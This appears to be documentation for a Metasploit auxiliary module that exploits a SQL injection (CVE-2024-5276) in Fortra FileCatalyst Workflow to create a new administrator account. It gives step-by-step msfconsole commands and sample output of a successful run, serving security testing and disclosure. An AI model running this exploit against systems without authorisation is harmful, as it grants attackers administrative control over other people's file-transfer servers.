## Vulnerable Application

This module exploits a SQL injection vulnerability in Fortra FileCatalyst Workflow <= v5.1.6 Build 135 (CVE-2024-5276), by adding a new
administrative user to the web interface of the application.

The vendor published an advisory [here]
(https://support.fortra.com/filecatalyst/kb-articles/advisory-6-24-2024-filecatalyst-workflow-sql-injection-vulnerability-YmYwYWY4OTYtNTUzMi1lZjExLTg0MGEtNjA0NWJkMDg3MDA0)
and [here](https://www.fortra.com/security/advisories/product-security/fi-2024-008).

The advisory from Tenable is available [here](https://www.tenable.com/security/research/tra-2024-25).

## Testing

The software can be obtained from the [vendor](https://www.goanywhere.com/products/filecatalyst/trial).

Deploy it by following the vendor's [installation guide]
(https://filecatalyst.software/public/filecatalyst/Workflow/5.1.6.139/FileCatalyst_Web_Tomcat_Installation.pdf).

**Successfully tested on**

- Fortra FileCatalyst Workflow v5.1.6 (Build 135) on Windows 10 22H2
- Fortra FileCatalyst Workflow v5.1.6 (Build 135) on Ubuntu 24.04 LTS

## Verification Steps

1. Deploy Fortra FileCatalyst Workflow <= v5.1.6 Build 135
2. Start `msfconsole`
3. `use auxiliary/admin/http/fortra_filecatalyst_workflow_sqli`
4. `set RHOSTS <IP>`
5. `set RPORT <PORT>`
6. `set TARGETURI <URI>`
7. `set NEW_USERNAME <username>`
8. `set NEW_PASSWORD <password>`
9. `run`
10. A new admin user should have been successfully added.

## Options

### NEW_USERNAME
Username to be used when creating a new user with admin privileges.

### NEW_PASSWORD
Password to be used when creating a new user with admin privileges.

### NEW_EMAIL
E-mail to be used when creating a new user with admin privileges.

## Scenarios

Running the module against FileCatalyst Workflow v5.1.6 (Build 135) on either Windows 10 22H2 or Ubuntu 24.04 LTS should result in an output
similar to the following:

```
msf6 auxiliary(admin/http/fortra_filecatalyst_workflow_sqli) > run
[*] Running module against 192.168.137.195

[*] Starting SQL injection workflow...
[+] Server reachable.
[*] JSESSIONID value: CBD945F52F91E0F4354296C939BDABDE
[*] FCWEB.FORM.TOKEN value: IvHIPuxllBiHOfXzLlaS
[*] Redirect #1: /workflow/createNewJob.do?.rnd2=3324035&FCWEB.FORM.TOKEN=IvHIPuxllBiHOfXzLlaS
[*] Redirect #2: /workflow/jsp/chooseOrderForm.jsp?.rnd2=3324040&FCWEB.FORM.TOKEN=IvHIPuxllBiHOfXzLlaS
[*] Received expected response.
[+] SQL injection successful!
[*] Confirming credentials...
[*] FCWEB.FORM.TOKEN value: IvHIPuxllBiHOfXzLlaS
[+] Login successful!
[+] New admin user was successfully injected:
	elroy:yodTwsPs
[+] Login at: http://192.168.137.195:8080/workflow/jsp/logon.jsp
[*] Auxiliary module execution completed
```
